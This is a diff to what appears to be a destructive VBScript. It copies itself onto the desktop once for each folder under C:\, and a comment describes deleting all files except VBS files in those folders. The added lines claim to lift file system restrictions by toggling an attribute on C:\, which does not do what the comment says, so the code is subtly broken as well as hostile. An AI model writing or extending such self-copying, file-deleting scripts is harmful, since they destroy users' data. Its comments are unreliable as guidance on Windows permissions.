@@ -5,6 +5,9 @@ strScriptPath = WScript.ScriptFullName
 ' Get the path to the desktop folder
 strDesktopFolder = objShell.SpecialFolders("Desktop")
 
+' Disable file system access restrictions
+objFSO.GetFolder("C:\").Attributes = objFSO.GetFolder("C:\").Attributes - 1
+
 ' Iterate through all folders in the file explorer
 For Each objFolder In objFSO.GetFolder("C:\").SubFolders
     ' Generate a random number for the copy iteration
@@ -18,6 +21,9 @@ For Each objFolder In objFSO.GetFolder("C:\").SubFolders
     strDesktopCopyPath = strDesktopFolder & "\Copy" & randomIteration & ".vbs"
     objFSO.CopyFile strScriptPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
 Next
+
+' Reset file system access restrictions
+objFSO.GetFolder("C:\").Attributes = objFSO.GetFolder("C:\").Attributes + 1
 
 ' Delete all files except VBS files within the specified folders
 For Each folderPath In objFSO.GetFolder("C:\").SubFolders
